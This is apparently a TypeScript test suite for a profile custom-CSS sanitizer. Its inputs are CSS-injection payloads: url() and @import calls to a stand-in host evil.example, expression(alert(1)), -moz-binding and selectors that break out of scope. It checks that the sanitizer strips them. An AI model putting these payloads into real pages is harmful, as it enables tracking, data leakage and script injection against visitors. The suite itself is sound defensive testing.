/**
 * Escape-test suite for the profile custom-CSS sanitizer. Run:
 *   npx tsx scripts/test-custom-css.ts
 *
 * Each case asserts that an attack is neutralized (the dangerous token is gone)
 * and that legitimate CSS survives (scoped, not stripped).
 */

import { sanitizeCustomCss, CUSTOM_CSS_SCOPE } from "../src/lib/profile/cssSanitize";

let pass = 0, fail = 0;
const SCOPE = `.${CUSTOM_CSS_SCOPE}`;

function check(name: string, ok: boolean, detail = "") {
  if (ok) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.log(`  ✗ ${name} ${detail}`); }
}

function absent(name: string, input: string, needle: RegExp) {
  const { css } = sanitizeCustomCss(input);
  check(name, !needle.test(css), `\n    → produced: ${css.replace(/\n/g, " ")}`);
}

console.log("Custom-CSS sanitizer — escape tests\n");

// 1. Layout escape
absent("drops position: fixed", ".x { position: fixed; top: 0; }", /position\s*:\s*fixed/i);
absent("drops position: sticky", ".x { position: sticky; top: 0; }", /position\s*:\s*sticky/i);

// 2. External resources / exfiltration
absent("drops external url()", ".x { background: url(https://evil.example/pixel.png); }", /evil\.example/i);
absent("drops data: url()", ".x { background: url(data:image/svg+xml;base64,AAAA); }", /data:/i);
absent("keeps our R2 url()", ".x { background: url(https://gs-ugc.empac.co/a.png); }", /THIS_WILL_NOT_MATCH/);
{
  const { css } = sanitizeCustomCss(".x { background: url(https://gs-ugc.empac.co/a.png); }");
  check("R2 url() survives", /gs-ugc\.empac\.co/.test(css), `\n    → ${css}`);
}

// 3. Legacy script-in-CSS
absent("removes @import", "@import url(https://evil.example/x.css); .x { color: red; }", /@import/i);
absent("removes @font-face", "@font-face { font-family: e; src: url(https://evil.example/f.woff); }", /@font-face/i);
absent("drops expression()", ".x { width: expression(alert(1)); }", /expression\s*\(/i);
absent("drops -moz-binding", ".x { -moz-binding: url(https://evil.example/x.xml); }", /-moz-binding/i);
absent("drops behavior", ".x { behavior: url(#default#time2); }", /behavior\s*:/i);

// 4. Scope escapes
{
  const { css } = sanitizeCustomCss("html, body, :root { background: red; }");
  check("html/body/:root rewritten to scope", !/(^|[^.\w])(html|body|:root)\b/i.test(css) && css.includes(SCOPE), `\n    → ${css}`);
}
{
  const { css } = sanitizeCustomCss(".navbar { display: none; }");
  check("bare selector is scoped", css.trim().startsWith(SCOPE), `\n    → ${css}`);
}
{
  const { css } = sanitizeCustomCss("* { color: red; }");
  check("universal selector is scoped", css.includes(`${SCOPE} *`), `\n    → ${css}`);
}

// 5. Legit CSS survives (scoped)
{
  const { css } = sanitizeCustomCss(".pcard { border-radius: 20px; box-shadow: 0 4px 12px rgba(0,0,0,.3); background: linear-gradient(135deg,#5457e5,#8b5cf6); }");
  check("legit declarations survive", /border-radius/.test(css) && /box-shadow/.test(css) && /linear-gradient/.test(css), `\n    → ${css}`);
  check("legit rule is scoped", css.includes(`${SCOPE} .pcard`), `\n    → ${css}`);
}
{
  const { css } = sanitizeCustomCss("@keyframes pulse { from { opacity: .5 } to { opacity: 1 } } .x { animation: pulse 2s infinite; }");
  check("@keyframes preserved (frames not scoped)", /@keyframes pulse/.test(css) && /from\s*\{/.test(css) && css.includes(`${SCOPE} .x`), `\n    → ${css}`);
}
{
  const { css } = sanitizeCustomCss("@media (max-width: 600px) { .x { color: red; } }");
  check("@media preserved + inner scoped", /@media/.test(css) && css.includes(`${SCOPE} .x`), `\n    → ${css}`);
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
